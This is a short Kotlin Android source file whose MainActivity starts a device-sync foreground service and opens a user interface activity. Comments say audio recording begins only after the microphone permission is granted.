package com.example.devsync

import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Only start DeviceSyncService here (no dangerous permissions needed)
        // RecordingService is started AFTER RECORD_AUDIO permission is granted in UserInterfaceActivity
        val syncIntent = Intent(this, DeviceSyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(syncIntent)
        else
            startService(syncIntent)

        startActivity(Intent(this, UserInterfaceActivity::class.java))
        finish()
    }
}
